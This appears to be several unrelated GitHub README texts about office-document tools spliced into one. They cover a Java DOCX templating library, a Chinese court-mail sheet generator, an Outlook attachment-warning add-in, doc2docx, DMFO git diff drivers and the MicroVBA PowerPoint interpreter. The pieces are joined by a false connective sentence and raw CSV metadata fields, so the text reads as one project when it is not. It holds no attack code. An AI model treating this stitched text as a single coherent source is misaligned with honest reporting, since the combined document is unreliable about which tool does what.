Ziel und Art der Speicherung können selbst implementiert werden, indem die Schnittstelle Result implementiert wird. Alternativ können vordefinierte Implementierungen genutzt werden.

```java
  // Nutzen von fertigen Implementierungen
  Result resultToFile = ResultFactory.toFile(Paths.get(""output.docx""));
 
  // oder per Lambda-Ausdruck
  Result resultToLambda = (data) -> System.out.println(Arrays.toString(data));
 
  // oder klassisch
  Result resultToInnerClass = new Result() {
      public void writeResult(byte[] dataToWrite) throws IOException {
          System.out.println(Arrays.toString(dataToWrite));
      };
  };
 
```

# Umgang mit dem Einsetzen/Ersetzen von Bildern in Dokumenten
Bilder können in Vorlage-Dokumenten eingesetzt sowie durch andere ersetzt werden. Bei
Text-Platzhaltern (MergeFields bei Microsoft, User-Def-Fields bei Libre/Openoffice), wird bei
einem Bild-Wert `com.mz.solutions.office.model.images.ImageValue` an jene Stelle das
als `com.mz.solutions.office.model.images.ImageResource` geladene Bild eingesetzt unter
Verwendung der angegebenen Abmaße aus dem Bild-Wert.

Bestehende Bilder können ersetzt/ausgetauscht werden und, wenn gewünscht, deren bestehenden
Abmaße in der Vorlage mit eigenen überschrieben/ersetzt werden. Bild-Platzhalter, also in der
Vorlage bereits existierende Bilder, werden als Platzhalter erkannt, wenn dem Bild in der
Vorlage in den Eigenschaften (Titel, Name, Beschreibung, Alt-Text) ein bekannter Platzhalter
mit Bild-Wert angegeben wurde. Genaueres ist den folgenden Klassen zu entnehmen:

`com.mz.solutions.office.model.images.ImageResource`
 Bild-Datei/-Resource (Bild als Byte-Array mit Angabe des Formates)

 `com.mz.solutions.office.model.images.ImageValue`
 Bild-Wert (Resource) mit weiteren Angaben wie Titel (optional), Beschreibung (optional)
 und anzuwendende Abmaße.

Ein Bild-Wert (`com.mz.solutions.office.model.images.ImageValue`) besitzt eine
zugeordnete Bild-Resource (`com.mz.solutions.office.model.images.ImageResource`). Eine
Bild-Resource kann mehrfach/gleichzeitig in mehreren Bild-Werten verwendet werden.
Das Wiederverwenden von Bild-Resourcen führt zu deutlich kleineren Ergebnis-Dokumenten. Jene
Bild-Resource wird dann nur einmalig im Ergebnis-Dokument eingebettet.

```java
 // Create or load Image-Resources. Try to reuse resources to reduce the file size of the
 // result documents. Internally image resources cache the file content.
 ImageResource imageData1 = ImageResource.loadImage(
         Paths.get(""image_1.png""), StandardImageResourceType.PNG);

 ImageResource imageData2 = ImageResource.loadImage(
         Paths.get(""image_2.bmp""), StandardImageResourceType.BMP);

 ImageValue image1Small = new ImageValue(imageData1)
         .setDimension(0.5D, 0.5D, UnitOfLength.CENTIMETERS)     // default 3cm x 1cm
         .setTitle(""Image Title"")                                // optional
         .setDescription(""Alternative Text Description"");        // optional

 ImageValue image1Large = new ImageValue(imageData1) // same image as image1Small (sharing res.)
         .setDimension(15, 15, UnitOfLength.CENTIMETERS);

 ImageValue image2 = new ImageValue(imageData2)
         .setDimension(40, 15, UnitOfLength.MILLIMETERS)
         .setOverrideDimension(true);

 // Assigning ImageValue's to DataValue's
 final DataPage page = new DataPage();

 page.addValue(new DataValue(""IMAGE_1_SMALL"", image1Small));
 page.addValue(new DataValue(""IMAGE_1_LARGE"", image1Large));
 page.addValue(new DataValue(""IMAGE_2"", image2));
 page.addValue(new DataValue(""IMAGE_B"", image2)); // ImageValue's are reusable
```

# Dokument-Anweisungen mit `DocumentProcessingInstruction` übergeben
Dem Ersetzungs-Vorgang können weitere Anweisungen/Callbacks mit übergeben werden. Derzeit
mögliche Anweisungen ist das Abfangen (oder gezielte Laden) von Dokumenten-Teilen (also XML
Dateien im ZIP Container) und der Bearbeitung des XML-Baumes vor und/oder nach Ausführung des
Ersetzungs-Vorganges.

Bei LibreOffice/Apache-OpenOffice sowie Microsoft Office können dazu bei ODT und DOCX
Dateien die Kopf- und Fußzeilen im Ersetzungs-Prozess mit einbezogen werden.

Alle Anweisungen können erstellt werden über die vereinfachten Factory-Methoden in
`com.mz.solutions.office.instruction.DocumentProcessingInstruction` oder händisch durch
Implementieren der jeweiligen Klassen.

__Kopf- und Fußzeilen werden `ODT` und `DOCX` Dokumente unterstützt.__
```java
 // A document containing (maybe) a header and a footer
 final OfficeDocument anyDocument = ...

 final DataPage documentData = ...
 final DataPage headerData = ...     // Values for header placeholders
 final DataPage footerData = ...     // Values for footer placeholders

 anyDocument.generate(documentData, ResultFactory.toFile(invoiceOutput),
         DocumentProcessingInstruction.replaceHeaderWith(headerData),
         DocumentProcessingInstruction.replaceFooterWith(footerData));
         
 // a shorter way to replace header and footer if the same model is used:
 final DataPage headerFooterSameData = ...    // (same) values for header AND footer
 
 anyDocument.generate(documentData, ResultFactory.toFile(invoiceOutput),
         DocumentProcessingInstruction.replaceHeaderFooterWith(headerFooterSameData));
         
```

___Document-Interceptors werden bei beiden Office-Implementierungen unterstützt.___
```java
 final DocumentInterceptorFunction interceptorFunction = ...
 final DocumentInterceptorFunction changeCustomXml = (DocumentInterceptionContext context) -> {
     final Document xmlDocument = context.getXmlDocument();
     final NodeList styleNodes = xmlDocument.getElementsByTagName(""custXml:customers"");

     // add/remove/change XML document
     // 'context' should contain all data and access you will need
 };

 anyDocument.generate(documentData, ResultFactory.toFile(invoiceOutput),
         // Intercept main document part (document body)
         DocumentProcessingInstruction.interceptDocumentBody(
                 DocumentInterceptorType.BEFORE_GENERATION,  // invoke interceptor before
                 interceptorFunction, // change low level document function (Callback-Method)
                 dataMapForInterceptorFunctionHere), // data is optional
         // Intercept styles part of this document, maybe to change font-scaling afterwards
         DocumentProcessingInstruction.interceptDocumentStylesAfter(
                 interceptorFunction), // no data for this callback function
         // let us change the Custom XML Document Part (only MS Word) und fill with our data
         DocumentProcessingInstruction.interceptXmlDocumentPart(
                 ""word/custom/custPropItem.xml"", // our Custom XML data
                 DocumentInterceptorType.AFTER_GENERATION, // before or after doesn't matter
                 changeCustomXml));
         
```

# Removing optional/conditional paragraphs and tables in a document
Using `StandardFormatHint.*` placeholder values you are able to keep, remove or hide a paragraph. There are also placeholder values to keep or remove full tables.

Most templates contain paragraphs and/or tables that are only useful in some circumstances (conditional). Using these special placeholder values you are able to control the existence of these.

Imagine there is a document with the following content and structure of placeholders (in this case `MERGEFIELD`s):

```
  [Paragraph 1] Please pay the course registration fee now. The course fee is due two weeks before
                the course starts. { MERGEFIELD INV_P_NORMAL }
                
  [Paragraph 2] Registration fee and course fee are due two weeks before the course starts. { MERGEFIELD INV_P_TWO_WEEKS_ONLY }
  
  [Paragraph 3] Please pay the registration fee and course fee as quick as possible. { MERGEFIELD INV_P_LESS_THAN_TWO_WEEKS }
```

Depending on your data (e.g. invoice) there is the possibility to control which paragraph should remain in the generated document.

```java
  final DataPage invPage = new DataPage();
  final LocalDate courseBeginDate = ...
  final LocalDate invDate = ...
 
  final long dueDays = DAYS.between(invDate, courseBeginDate);
 
  if (dueDays > 21) {
      invPage.addValue(new DataValue(""INV_P_NORMAL"", StandardFormatHint.PARAGRAPH_KEEP));
      invPage.addValue(new DataValue(""INV_P_TWO_WEEKS_ONLY"", StandardFormatHint.PARAGRAPH_REMOVE));
      invPage.addValue(new DataValue(""INV_P_LESS_THAN_TWO_WEEKS"", StandardFormatHint.PARAGRAPH_REMOVE));
  } else if (dueDays > 14) {
      invPage.addValue(new DataValue(""INV_P_NORMAL"", StandardFormatHint.PARAGRAPH_REMOVE));
      invPage.addValue(new DataValue(""INV_P_TWO_WEEKS_ONLY"", StandardFormatHint.PARAGRAPH_KEEP));
      invPage.addValue(new DataValue(""INV_P_LESS_THAN_TWO_WEEKS"", StandardFormatHint.PARAGRAPH_REMOVE));
  } else {
      invPage.addValue(new DataValue(""INV_P_NORMAL"", StandardFormatHint.PARAGRAPH_REMOVE));
      invPage.addValue(new DataValue(""INV_P_TWO_WEEKS_ONLY"", StandardFormatHint.PARAGRAPH_REMOVE));
      invPage.addValue(new DataValue(""INV_P_LESS_THAN_TWO_WEEKS"", StandardFormatHint.PARAGRAPH_KEEP));
  }
```

The same is applicable with tables using `StandardFormatHint.TABLE_KEEP` to indicate that a table should remain in a document and that this table should be normal replaced. Using `StandardFormatHint.TABLE_REMOVE` instructs the process to fully remove a table without further replacement.

## 规则

1. 当事人收信规则，没代理律师的每个当事人一份，有委托律师的只要寄给律师一份，多个律师寄给第一个律师，同一律所也是一份 

1.1 判决书过滤词汇，判决书如果每行包含如下就不提取信息  

词汇1：法定代表|诉讼|代理人|判决|律师|请求|证据|辩称|辩论|不服  
词汇2：上市|省略|区别|借款|保证|签订  

2. 字段解析:  

OA表【data_oa.xlsx】必须字段:  
| 【立案日期】 | 【适用程序】 | 【案号】 | 【原一审案号】 | 【承办人】 | 【当事人】 | ... |  
Data表【data_main.xlsx】必须字段(包括程序生成):  
| 【立案日期】 | 【适用程序】 | 【案号】 | 【原一审案号】 | 【判决书源号】 | 【主审法官】 | 【当事人】 | 【诉讼代理人】 | 【地址】 | ... |  
注意： 数据表处理后【承办人】会更换为【主审法官】  

3. 【诉讼代理人】规则:  

**注意：姓名和曾用名如例子所示，'/'前面是当事人，后面是律师，'_'连接电话，逗号'，'表示分隔，顿号表示一起，'/地址：'不能缺**     

Data表部分字段演示：  

| 【当事人】 | 【诉讼代理人】 | 【地址】 |
| --- | --- | --- |
| 申请人:姓名AAA，被申请人:姓名BBB| 姓名AAA/律师姓名CCC_电话，姓名BBB_电话 | 姓名BBB/地址：XXX市XXX，姓名CCC/地址：XXXX市XXX |
| 申请人:张三(曾用名张五)、李四、王五 | 张三(曾用名张五)/律师张二三_123123_李三四_123123 | 张二三/地址：XXXX市XXX |
| 申请人:赵六(曾用名:赵五)、孙七、周八 | 赵六(曾用名:赵五)，孙七、周八/代理人吴九_123123，郑十/委托人张三_123123| 赵六(曾用名:赵五)/地址：XXX市XXX，吴九/地址：XXX市XXX，张三/地址：XXX市XXX |

4. 【适用程序】规则(系列案用):  

此处在OA表中当事人几个案件中完全相同就合并为一个案件,发一次邮单,假如人员稍有差别,仍然按原来分开处理  

例如：  

| 【适用程序】 | 【案号】 |
| --- | --- |
| 2160、2161_集合 | 2160 |
| 2160、2161_集合 | 2161 |


5. conf.txt:  
```python
[config]
data_xlsx = data_main.xlsx    # 数据模板地址
data_oa_xlsx = data_oa.xlsx    # OA数据地址
sheet_docx = sheet.docx    # 邮单模板地址
flag_fill_jdocs_infos = 1    # 是否填充判决书地址
flag_append_oa = 1    # 是否导入OA数据
flag_to_postal = 1    # 是否打印邮单
flag_check_jdocs = 0    # 是否检查用户格式,输出提示信息
flag_check_postal = 0    # 是否检查邮单格式,输出提示信息
data_case_codes =    # 指定打印案号,可接多个,示例:AAA号,BBB号,优先级1
data_date_range =   # 指定打印数据日期范围示例:2018-09-01:2018-12-01,优先级2
data_last_lines = 10    # 指定打印最后行数,优先级3
```

## 详细指南

简称：  
- [A表: data_oa.xlsx,OA表自己下载,这个只是参考](./demo_docs/data_oa.xlsx)  
- [B表: data_main.xlsx,会自动生成,也要修改](./demo_docs/data_main.xlsx)  
- [C目录: jdocs/,判决书目录,要放下载的判决书](./demo_docs/jdocs/)  
- [D文档: sheet.docx,邮单模板,按照背景生成邮单](./demo_docs/sheet.docx)  
- [E目录: postal/,邮单目录](./demo_docs/postal/)  

1. 根据 **A表** 格式,整理自己的OA表(没数据是没用的),先在OA表中修改【适用程序】(系列案),修改conf.txt文件,参考[规则](#规则),如文件丢失再次运行会生成  

2. 手动下载在线判决书[中国裁判文书网](http://wenshu.court.gov.cn/),判决书docx文件放在**C目录**   

3. 第一次运行(不带【诉讼代理人】)  

3.2. 运行会自动重命名判决书 **C目录** ,提取判决书内容 **address_tmp.xlsx**     
3.3. 自动从 **A表** 添加数据到 **B表**  
3.4. 自动通过 **D文档** 批量输出寄送邮单到 **E目录**  
3.5. 自动生成临时文件 ***data_tmp.xlsx*** 用于校对,是邮单信息来源   
3.6. 运行记录在log.txt  

4. 手动填充 **完整** 的律师(代理人)及当事人信息到 **B表**，具体是填写【诉讼代理人】信息(电话地址)，参考[规则](#规则)  

5. 第二次运行(带【诉讼代理人】)  
会重复 3.4.  3.5. 3.6.  

6. 小白没有python环境，可以直接下载最新的exe版本，使用前先配置conf.txt文件

## Project 1:  Outlook Protect ##

Outlook addin to help protect users from accidental sending of attachments to external domains from your organisation. 
This also look for any attachments in the email. 

You will need to define your organisation domain name in configuration file.
It will then treat all other domain as external and show alert popup when user click on send button.

1) Configuration stored at OutlookUtility.cs: 

Replace gmail with your own domain value.
private static readonly string ALLOWED_DOMAIN = @""gmail""; // your org domain name.

2) All VSTO application requires code signing, It is recommended that you use your or code signing certificate, alternatly visual studio automatically create and sign cert automatically.


## Project 2:  Office Helper ##

Office Helper Add-ins is a chat utility that provide access of chat utilities from office application.

sharing common configurations (SupportChat.xml), source code (ChatRibbon.cs) and chat icon (Chat.png) file; All common files are stored at common location i.e. $\officehelper-vsto\resource. 

1)	Chat.png: This file is used to display chat icon across all MS office products. (Under Home, Support tab)									
	This file must be in png format, 
	This file must have 74X74 dimension,
	This file name must be chat.png.

To change the image file, you first need to replace this file in this folder repackage the application.

The project incorporated the use of a fullstack lineup including:

ickc,doc2docx,,https://github.com/ickc/doc2docx,https://api.github.com/repos/doc2docx/ickc,Batch converts `.doc` to `.docx` using Microsoft Office 2011 for Mac,"# Description

Batch converts `.doc` to `.docx` using Microsoft Office 2011 for Mac.

# Install

- Microsoft Office 2011 for Mac
- copy `doc2docx.app` to `Applications`

# Usage

Either:

- GUI: drag a file or folder to the `doc2docx.app`
- CLI: `open <path_to>/doc2docx.app --args <folder>`

Alternatively, there's a lightweight `doc2docx.workflow`:

```bash
automator -i <path-to-folder> <path-to>/doc2docx.workflow
```

In addition, there are 2 workflows that uses Microsoft Word 2011 for Mac's action for conversion (the above uses Applescript), put in the folder `achive/`. But I found that the Microsoft Office 2011 provided automator component doesn't really convert doc to docx in the way that

1. file size does not change.
2. pandoc cannot read it.

Because of that, the achived scripts is of limited use.

Note: a `ppt2pptx.app` is newly added, but it assumes all files in the folder are presentation without checking it @todo

# Why not 2016?

- Microsoft Word 2016 is a regression in terms of both `.doc` handling and automator integration. YMMV if you use 2016 instead.

# Summary
The goals of this project are to produce the following utility functions to automate some of the boring stuff with MS Word (.docx) files:

- [x] Read a .docx file with generic (built-in) styles and write a copy with custom styles preserving the content (i.e., map one style to another).
- [x] Read a .docx file and write individual .docx files based on a user-defined breaking style (e.g., parse a book into chapter files).
- [x] Read a list of .docx files and write into a single concatenated .docx file (e.g., merge chapters into a book).
- [x] Read a .docx file and find the paragraphs that contain embedded images

A lower priority is to create supplemental utility functions that:

- [ ] Searches the content of one or more .docx files for abbreviations and save the results to a table (i.e., create a vocab table).

See separate issues for more details.

This project makes use of the `python-docx`, a Python API for Microsoft Word .docx files, with [documentation][pydocx-doc] and [repository][pydocx-rep] that are licensed and copyrighted by [Scanny][scanny] using the [MIT license][pydocx-lic].

This is a set of scripts that enable convenient diff and merge of Office-related file
types (currently Word and PowerPoint (diff only)). The office application will be
started using COM automation, thus an Office installation is required.

DMFO is LFS compatible.

**Important:** Legacy PowerShell scripts are located in [ps1][ps1] and may still be
used. However, not all new features will be ported back to the ps1 scripts.

## Usage

### Installation

Installable with `pip` or [`pipx`][pipx] (recommended).

```cmd
pipx install DMFO
```

or

```cmd
pipx install git+https://github.com/lcnittl/DMFO.git
```

### Git Integration

These tools are intended to be used with Git, so that `git diff` and `git merge` will
use Office applications to compare and ""merge"" files. Simply configure `.gitattributes`
and `.gitconfig` to support the DMFO diff and merge driver. Enjoy to diff and merge
Office documents by simply running:

```cmd
> git diff
> git merge
```

as usual and with any paramter they accept.

#### `.gitconfig`

Simply register the diff and merge drivers by running `dmfo install` (scope can be given
by appending `system`, `global`, `local` or `worktree`, default is `global`).

Alternatively, add the entries manually to your git config:

```ini
[diff ""dmfo""]
	name = DMFO diff driver
	command = dmfo diff
	binary = true
[merge ""dmfo""]
	name = DMFO merge driver
	driver = dmfo merge %O %A %B %L %P
	binary = true
```

Make sure that `dmfo`'s path is in your path variable, otherwise prepand `dmfo` with the
executable's path.

#### `.gitattributes`

Specify the following drivers in your `.gitattributes` file (currently DMFO is only
supporting Word files):

```
*.doc diff=dmfo merge=dmfo
*.docx diff=dmfo merge=dmfo
*.ppt diff=dmfo
*.pptx diff=dmfo
```

### CLI

This option might be added at a later time.

## Reqirements

- Git (for Windows)
- Microsoft Office (\[and/or\]: Word, Powerpoint)

## Platform

In its current implementation, DMFO is suited for Windows 10. Not tested on other
platforms.

A collection of utilities for every day office / personal use that can be piped together. Inspired by the Unix philosophy.

Most office work in today's age is IT enabled. For example, recently, I wanted to collect some details (photograph, favourite Bible verse) from my graduating class so as to prepare a deck of slides. At first I turned to a few well known IT solutions to do the job and found out that they wouldn't exactly fit my need. Hence, I ended up asking each student to email the details to me, which I later compiled manually.

I believe such as situation is not uncommon in most people's experience. And as such, I offer here an approach which I believe has the potential to trully solve this problem.

To explain, the core tenents of this approach, I borrow the words of Unix pioneer, Douglas McIlroy:

(i) Make each program do one thing well. To do a new job, build afresh rather than complicate old programs by adding new features.

(ii) Expect the output of every program to become the input to another, as yet unknown, program. Don't clutter output with extraneous information. Avoid stringently columnar or binary input formats. Don't insist on interactive input.

This approach of combining small utilities that do their specific tasks really well is something that has survived many decades in the community of programmers. I believe, something substantial can be accomplished by applying this approach to the problems of everyday tasks. This is what this project strives to demonstrate.",0,0,2,0,office,"[office, utility]",0

nilostolte,MicroVBA-PowerPoint,,https://github.com/nilostolte/MicroVBA-PowerPoint,https://api.github.com/repos/MicroVBA-PowerPoint/nilostolte,"MicroVBA is a VBA interpreter written in VBA to be used in PowerPoint in order to be able to import large vector graphics files. The advantages are: vectorization of PowerPoint presentations (no fonts needed), can be used as a Vector Graphics File Format storage, smooth connectivity with VBA programs inside the PowerPoint presentations, simplification of complex objects construction, no limitations in the size of the files and more pertinent and helpful error messages.","# MicroVBA-PowerPoint
MicroVBA is a VBA interpreter written in VBA to be used in **PowerPoint** in order to be able to import large vector graphics files. The advantages are: **vectorization of PowerPoint objects** (particularly vectorized texts), **high level solution to convert from other vector graphics formats**, portable way **to store vector graphics objects outside PowerPoint**, **smooth connectivity** with VBA programs already inside PowerPoint presentations, simple programmable solution for complex objects construction, **no limitations in the size of the files** and **more pertinent and helpful error messages**. It actually does not need full VBA conpatibility, since it can smoothly integrate with VBA programs in the Powerpoint presentation.

## MicroVBA Interpreter

The MicroVBA interpreter can be found inside the file [**ReadMicroVBA.pptm**](https://github.com/nilostolte/MicroVBA-PowerPoint/blob/main/MicroVBA%20Interpreter/ReadMicroVBA.pptm) under the name of **MicroVBA**. The macro **MicroVBA**, when executed, actually reads the file [**macro.txt**](https://github.com/nilostolte/MicroVBA-PowerPoint/blob/main/MicroVBA%20Interpreter/macro.txt), which contains the MicroVBA program, and executes it. This program generates the vector objects shown in the presentation [menuInforgraphics6.pptx](https://github.com/nilostolte/MicroVBA-PowerPoint/blob/main/menuInforgraphics6.pptx).

The file [**macro.txt**](https://github.com/nilostolte/MicroVBA-PowerPoint/blob/main/MicroVBA%20Interpreter/macro.txt) was generated automatically by [Java2PPT](https://github.com/nilostolte/Java2PPT) project. This project allows to convert Java vector objects into MicroVBA
automatically. The Java program converted is [MenuInfographics6](https://github.com/nilostolte/Java-Vector-GUI/tree/main/MenuInfographics6), which was already available as an example of vector graphics GUI in Java (please check its [README file](https://github.com/nilostolte/Java-Vector-GUI/tree/main/MenuInfographics6#menuinfographics6)).

A [Digital Mock-Up in PowerPoint](https://github.com/nilostolte/MicroVBA-PowerPoint/tree/main/Example) is also available. In this mock-up the menu used as an example ([MenuInfographics6](https://github.com/nilostolte/Java-Vector-GUI/tree/main/MenuInfographics6)) that was converted to MicroVBA (file [**macro.txt**](https://github.com/nilostolte/MicroVBA-PowerPoint/blob/main/MicroVBA%20Interpreter/macro.txt)) is interpreted inside PowerPoint using [MicroVBA interpreter](https://github.com/nilostolte/MicroVBA-PowerPoint/blob/main/MicroVBA%20Interpreter/ReadMicroVBA.pptm) 
and the resulting object is used in a [presentation](https://github.com/nilostolte/MicroVBA-PowerPoint/blob/main/Example/testfontsembedded.pptm) that mimicks the original [program](https://github.com/nilostolte/Java-Vector-GUI/tree/main/MenuInfographics6). When one clicks one item of the menu, a text appears explaining what the menu item activates when clicked. This example shows how our system can be used for automatic creation of digital mock-ups of Java interfaces in PowerPoint. 

A part of **macro.txt** is used in the section [Understanding PowerPoint Internal Path Representation](https://github.com/nilostolte/MicroVBA-PowerPoint#understanding-powerpoint-internal-path-representation) as an example to show how to create paths with subpaths using MicroVBA in PowerPoint.

## Overview
MicroVBA programs can theoretically run as macros in PowerPoint. However, due to limitations in the size of VBA procedures, 
VBA macros cannot be used as a general multi-purpose **Vector Graphics File Format**, since complex vector graphics files almost always have much more than 64kB. **MicroVBA solves this problem** and can definitely be used as a vector graphics file format with no limitations in size. Thus, **MicroVBA is a language that is between PostScript and PDF**, because it has limited programming features, even though it is more programmable than PDF and it can be connected to a full-fledged VBA program already in the PowerPoint presentation. It has all characteristics of PostScript with advantages, since Powerpoint is able to handle transparency (just like PDF). In this sense, MicroVBA uses PowerPoint as its rendering engine, in the same way PostScript files need an interpreter to display their content and PDF files also need a program (like Acrobat) to be rendered.

MicroVBA has three huge advantages over PostScript and PDF:
- It is VBA Basic, which is far much simpler than PostScript and PDF.
- It is a text file that can be part of a larger real program in VBA inside a PowerPoint presentation. That is, its excellent connectivity surpasses PostScript that can hardly be used in conjunction with something else except itself. It also largely surpasses PDF too, since PDF is a closed, mostly binary format, that also cannot be used outside of itself. In addition, the lightweight MicroVBA interpreter footprint does not overshadow simple VBA programs. PostScript interpreters and PDF renderers are just gigantic software.
- It can generate a very high end presentation using a tool that everybody knows how to use.

In addition to that, the choice of using real VBA commands makes MicroVBA code snippets easily debugged directly as PowerPoint macros, a  particularity that can only be compared with PostScript language. However, once an object is created in PowerPoint using a code snippet, it can then be copied, pasted, translated and scaled in a presentation. This principle is used below to explain how to construct PowerPoint paths. This is far superior and powerful than PostScript programming language because its code can only produce a rendering on the screen, except when it is explicitly converted to another format.

As one can easily see, MicroVBA opens the door to very powerful uses that were difficult to imagine without it. This is nearly an ideal solution because the heavy graphics can be left to MicroVBA to handle. The graphics can also come from other sources and be converted from other formats given by professional artists, for example.

What completes the use of MicroVBA are **convertions from other vector formats**. This has already been accomplished by a modification of FreeHEP project that generates a MicroVBA file from whatever a Java program shows (See the project [here](https://github.com/nilostolte/Java2PPT#java2ppt)). Even though this looks more like a programmer's solution, that is not really the case because the Java vector information can be stored in a file using an intermediate file format. This file can be read and the program can then convert the information into MicroVBA.

The first lines expose a major simplification used in MicroVBA: the parser cannot handle more than two indirections. This is not really a big problem, since indirections can be broken by subdividing them and storing them in a cascade of variables as shown above. Another limitation, is that expressions are not allowed. Also no VBA function is yet supported, except functions from objects as shown in the example. Functions can be easily wrapped into an object (named _""VBA""_, for example, where all the functions can be accessed as methods from this object). This has not been done because it is probable that this has already been done somewhere although it has not yet been found. This would be a useful contribution to this project. 

Finally, arithmetic operations can also be implemented as methods in the same object, for example, thus, avoiding complex expressions parsing which is not only slow but also increases too much the size of the interpreter. Complex expressions can be broken in simpler parts that are parsed and executed much faster than wasting time in the analysis of expressions. This principle is very similar to the one found in RISC processors. The reason RISC processors are so common nowadays is because it is better to have many more simple RISC cores than having a single complex one. It also consumes much less energy and has the potential to be much faster as all cores are used in a set of threads that are all executed in parallel. A similar reasoning applies here, since a simpler interpreter can revamp programs that already use the full VBA potential.

### Contructing Paths in PowerPoint

In the above example we can notice that paths are constructed using **BuildFreeform**. The parameters passed to the BuildFreeform are the coordinates of the first _""moveto""_ of the path (for a better understanding of paths please refer to [_""path definition""_](https://github.com/nilostolte/ClockWidget#paths) and [_""path commands""_](https://github.com/nilostolte/ClockWidget/blob/main/README.md#path-commands)). These coordinates are particularly important for complex paths in Powerpoint. Actually, there are no _""moveto""_ commands inside a 
path in Powerpoint. This is a huge limitation (also see [PowerPoint Caveats](https://github.com/nilostolte/MicroVBA-PowerPoint/blob/main/PowerPoint%20Caveats.md)) that is bypassed by an undocumented feature that can be used when defining complex paths. As in paths in other vector graphics languages, one can insert several subpaths inside a single path, but in Powerpoint this must be done according to certain rules. Although these rules are not always necessary they are simple to implement and understand:

- The first path in the group of subpaths must start with the initial _""moveto""_ declared in **BuildFreeform**
- The first path must be closed either using a _""lineto""_ to the coordinates indicated in **BuildFreeform** or they must be the last coordinates of a Bezier curve.
- The first _""moveto""_ of a subpath is actually a _""lineto""_ with its initial coordinates
- The subpath must be closed either with a ""_lineto_"" to the same coordinates or using these coordinates as the last coordinates of a Bezier curve.
- Then another _""lineto""_ to the initial coordinates in **BuildFreeform** must appear, except in the last subpath

In the example above we can identify 6 subpaths. The first obviously start with the coordinates declared in **BuildFreeform**:

``` vba
    Set MyPath = MyShapes.BuildFreeform(0, 286.75, 156.8356)
```

And is closed with the first _""lineto""_ back to the first coordinates of **BuildFreeform** 
```vba
    MyPath.AddNodes 0, 0, 286.75, 156.8356
```

Because the last coordinates of the last Bezier curve does not close the figure:

```vba
    MyPath.AddNodes 1, 1, 298.59, 156.17256, 297.92697, 156.8356, 297.11002, 156.8356
```

Now the following 5 subpaths start with _""lineto""_ and are closed with two _""lineto""_:

1. Second subpath
```vba
    MyPath.AddNodes 0, 0, 287.7641, 149.84082
          ⋮
    MyPath.AddNodes 0, 0, 287.7641, 149.84082
    MyPath.AddNodes 0, 0, 286.75, 156.8356
```
2. Third subpath
```vba
    MyPath.AddNodes 0, 0, 290.89017, 143.5017
          ⋮
    MyPath.AddNodes 0, 0, 290.89017, 143.5017
    MyPath.AddNodes 0, 0, 286.75, 156.8356
```
3. Fourth subpath
```vba
    MyPath.AddNodes 0, 0, 295.8221, 138.4389
          ⋮
    MyPath.AddNodes 0, 0, 295.8221, 138.4389
    MyPath.AddNodes 0, 0, 286.75, 156.8356
```
4. Fifth subpath
```vba
    MyPath.AddNodes 0, 0, 302.07687, 135.14767
          ⋮
    MyPath.AddNodes 0, 0, 302.07687, 135.14767
    MyPath.AddNodes 0, 0, 286.75, 156.8356
```
5. Sixth subpath
```vba
    MyPath.AddNodes 0, 0, 282.31, 150.9156
          ⋮
    MyPath.AddNodes 0, 0, 282.31, 150.9156
```
Notice that the last path does not need a _""lineto""_ to the begining of the first path. Also notice that _""lineto""_ commands are identified by four parameters. The first two should be 0, whereas the last two are the coordinates of the _""lineto""_. A _""curveto""_ command has eight parameters, where the first two are 1 and the other six parameters are the coordinates of the control points following the last point of the previous _""lineto""_ or _""curveto""_.

This solution has a drawback that can be used as a kind of WaterMark, as seen in [PowerPoint Caveats](https://github.com/nilostolte/MicroVBA-PowerPoint/blob/main/PowerPoint%20Caveats.md).

### Executing the Example

Opening the file [PPTPathAnalysis.pptm](https://github.com/nilostolte/MicroVBA-PowerPoint/blob/main/PPTPathAnalysis.pptm), one sees a blank presentation. One should make sure to [enable macros](https://github.com/nilostolte/MicroVBA-PowerPoint/blob/main/Example/README.md#enabling-macros) in the PowerPoint application. The object must be created by the macro **example**. To see the macro, one should press **ALT+F8**. As a result one should get this window:

![image](https://user-images.githubusercontent.com/80269251/117228042-377db280-ade6-11eb-917a-66549aa73798.png)

#### Debugging the Example
Just click **Edit** instead of Run. The following window will open. Click on the statement **stop_here = 0** and press **F9**. This is a _""breakpoint""_, the point where the program will stop and wait until one allows it to continue.

![image](https://user-images.githubusercontent.com/80269251/117228832-dfe04680-ade7-11eb-9c23-01a129f24ad6.png)

#### Execution
Then click the Run button (a green right-facing arrowhead icon), choose **Run**, **Run Sub/User Form** from the menu bar or press **F5** to make the debugger stop at the line chosen, that is, to run the macro. One will have this content in the presentation, in the Powerpoint window:

![image](https://user-images.githubusercontent.com/80269251/117229502-25e9da00-ade9-11eb-9b8b-9857eead636e.png)

Going to this window, right click the object and choose **Edit Points**. One will get the following effect:

![image](https://user-images.githubusercontent.com/80269251/117229751-97298d00-ade9-11eb-96a6-09699409714c.png)

As one can see, the red lines are the _""lineto""_ commands to the first point of the path. These lines only appear when one choses **Edit Points** (they also appear if the PowerPoint file is converted to another vector graphics format, so this technique can also work as a sort of [watermark](https://github.com/nilostolte/MicroVBA-PowerPoint/blob/main/PowerPoint%20Caveats.md)). In fact all these elements are considered as a single object. One can also verify that in the VBA IDE window that the program stopped exactly where it was asked. One should leave it stopped at that point.

#### Invisible Points
In the Powerpoint window, the indicated points are a bit confusing because they do not correspond to the actual number of points created. When one clicks one of the points, other points appear. Some of these points really exist, and other are just graphics handles to change the geometry. This can be quite puzzling and confusing. 

To really see the actual points inside PowerPoint one has to use the debugger. Each point is stored in a structure called a **Node** and the path is stored in a Collection called **Nodes**. Since the debugger is stopped on a breakpoint, all the internal variables can be checked in the VBA IDE. To do that, one should first select the text **ActivePresentation.Slides(1).Shapes(1)**, right click the highlighted text, and click on **Add Watch...**, as indicated below:

![image](https://user-images.githubusercontent.com/80269251/117289921-30cd5a80-ae3b-11eb-8c6d-640d50a14578.png)

Then, in the **Add Watch** window just opened type **.Nodes** on the right of **ActivePresentation.Slides(1).Shapes(1)** as indicated below and click on the **OK** button.

![image](https://user-images.githubusercontent.com/80269251/117291954-9d495900-ae3d-11eb-8af2-1a085be2b56d.png)

The **Nodes** Collection will appear in the **Watches** subwindow. Expand **Watch** subwindow by press-clicking at the position indicated by the red cross inside the red circle and, still holding the mouse click button, pull it up as indicated below.

![image](https://user-images.githubusercontent.com/80269251/117293881-f619f100-ae3f-11eb-977b-d052f3340746.png)

Then click at the plus (**+**) sign on the left of **ActivePresentation.Slides(1).Shapes(1).Nodes** and on the right of the spectacles icon. To expand to see the complete name, just press-click at the vertical tab line on the left of **Value** and pull it to the right still holding the mouse click button.

